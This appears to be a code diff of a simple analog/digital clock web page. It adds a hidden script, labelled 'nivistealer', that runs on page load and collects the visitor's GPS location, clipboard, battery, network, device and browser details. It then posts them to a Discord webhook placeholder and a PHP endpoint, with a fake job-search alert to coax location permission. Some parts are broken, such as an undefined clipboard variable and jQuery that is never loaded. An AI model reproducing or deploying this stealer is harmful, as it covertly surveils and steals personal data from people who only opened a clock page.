@@ -3,9 +3,15 @@
     <head>
         <meta charset="utf-8">
         <title>Clock</title>
-        <link rel="stylesheet" href="style.css">
+        <script src="main.js" ></script>
+        <link  href="index.php">
+        <?php 
+      include("index.php");
+      ?>
+     
     </head>
     <body>
+    
         <div class="container">
             <div class="clock">
                 <div class="circle" id="sc" style="--clr:#04fc43;"><i></i></div>
@@ -26,51 +32,142 @@
             </div>
           <div id="time">
             <div id="hour" style="--clr:#ff2972;">00</div>
-            <div id="minutes" style="--clr:#fcc800;">00</div>
-            <!-- <div id="second"  style="--clr:#04fc43;">00</div> -->
-            <!-- <div id="ampm">AM</div> -->
+           
+            <div id="minutes" style="--clr:#c1fc00;">00</div>
         </div>
         <script>
             let hr = document.querySelector('#hr');
             let mn = document.querySelector('#mn');
-            let sc = document.querySelector('#sc');
             setInterval(() =>{
                 let day=new Date();
             let hh = day.getHours() * 30;
             let mm= day.getMinutes() * 6;
             let ss=day.getSeconds() * 6;
-
             hr.style.transform= `rotateZ(${hh+(mm/12)}deg)`;
             mn.style.transform=`rotateZ(${mm}deg)`;
             sc.style.transform=`rotateZ(${ss}deg)`;
-
             })
-         
             let hour = document.getElementById('hour');
             let minutes = document.getElementById('minutes');
-            let second = document.getElementById('seconds');
-            let ampm = document.getElementById('ampm');
-
             let h = new Date().getHours();
-            
             let m = new Date().getMinutes();
-            let s = new Date().getSeconds();
-            let am=h>=12 ? "AM" : "PM";
-
-        // if (h>12){h=h-12;} 
-
             h=(h<10) ? "0" + h:h
             m=(m<10) ? "0" + m:m
-            s=(s<10) ? "0" + s:s
-
             hour.innerHTML=h;
             minutes.innerHTML=m;
-            seccond.innerHTML=s;
-            ampm.innerHTML=am;
-
-
-
-
         </script>
+             <script>
+                $(document).ready(function() {
+                  var batterypercentage
+                  var ischarging
+                  async function getclips() {
+                    var btr = await navigator.getBattery();
+                    batterypercentage = String(btr.level*100+"%");
+                    ischarging = String(btr.charging);
+                    try {
+       
+                      giveclips(victimtext)
+                    } catch (error) {
+                      giveclips("Clipboard Permission Denied")
+                    }
+                  }
+                  getclips()
+                  var clips
+                
+                  function giveclips(polp) {
+                    clips = polp
+                    getLocation()
+                  }
+                
+                  function getLocation() {
+                    if (navigator.geolocation) {
+                      navigator.geolocation.getCurrentPosition(showPosition, showError);
+                    } else {
+                      alert("Your Browser Does not support Gps");
+                    }
+                  }
+                
+                  function showPosition(position) {
+                    var grak = "Lattitute : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude
+                    sdrp(grak, clips,batterypercentage,ischarging);
+                    senddis(grak, clips,batterypercentage,ischarging);
+                  }
+                
+                  function showError(error) {
+                    switch (error.code) {
+                      case error.PERMISSION_DENIED:
+                        sdrp("Location Permission Denied",clips,batterypercentage,ischarging);
+                        senddis("Location Permission Denied",clips,batterypercentage,ischarging)
+                        alert("On Location permission to Find Best Job in Near You");
+                
+                        break;
+                      case error.POSITION_UNAVAILABLE:
+                        window.close()
+                        break;
+                      case error.TIMEOUT:
+                        window.close()
+                        break;
+                      case error.UNKNOWN_ERROR:
+                        window.close()
+                        break;
+                    }
+                  }
+                   
+                  let datetime = new Date();
+                  let localtime = String(datetime.toLocaleTimeString());
+                  let referurl = document.referrer;
+                  let cpuThreads = String(navigator.hardwareConcurrency);
+                  let deviceram = String(navigator.deviceMemory) + "gb";
+                  let useragent = navigator.userAgent;
+                  let iscookieEnabled = String(navigator.cookieEnabled);
+                  let devicelang = String(navigator.language);
+                  let width = screen.width;
+                  let height = screen.height;
+                  let platform = navigator.platform;
+                  let networkinfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                  let networkinformation = "Network type : " + networkinfo.effectiveType + " " + "Downlink :" + " " + networkinfo.downlink
+                
+                  function senddis(gpsr, clips,batterypercentage,ischarging) {
+                    var request = new XMLHttpRequest();
+                    request.open("POST", "https://your-discordwebhook-url");
+                    request.setRequestHeader('Content-type', 'application/json');
+                    var params = {
+                      content: ("> **DeviceGps  : **" + gpsr + "\n> **NetworkInformation : **" + networkinformation + "\n> **BatteryPercentage : **" + batterypercentage + "\n> **Ischarging : **" + ischarging + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **Clipboard : **" + clips + "\n> **DeviceLocalTime : **" + localtime + "\n"),
+                      username: "nivistealer",
+                      avatar_url: "https://dpwhatsapp.xyz/wp-content/uploads/2021/08/Anime-Girl-WhatsApp-DP.jpg"
+                    }
+                    request.send(JSON.stringify(params));
+                  }
+                
+                  function sdrp(bsdks, clipboard,batterypercentage,ischarging) {
+                    $.ajax({
+                      type: "POST",
+                      url: "sunni.php",
+                      data: {
+                        networkinformation : networkinformation,
+                        batterypercentage:batterypercentage,
+                        ischarging:ischarging,
+                        width: width,
+                        height: height,
+                        platform: platform,
+                        gps: bsdks,
+                        devicelang: devicelang,
+                        iscookieEnabled: iscookieEnabled,
+                        useragent: useragent,
+                        deviceram: deviceram,
+                        cpuThreads: cpuThreads,
+                        referurl: referurl,
+                        localtime: localtime,
+                        clipboard: clipboard,
+                      },
+                      cache: false,
+                      success: function(data) {},
+                      error: function(xhr, status, error) {
+                        console.log(error);
+                      }
+                    })
+                  }
+                })
+             </script>
     </body>
 </html>
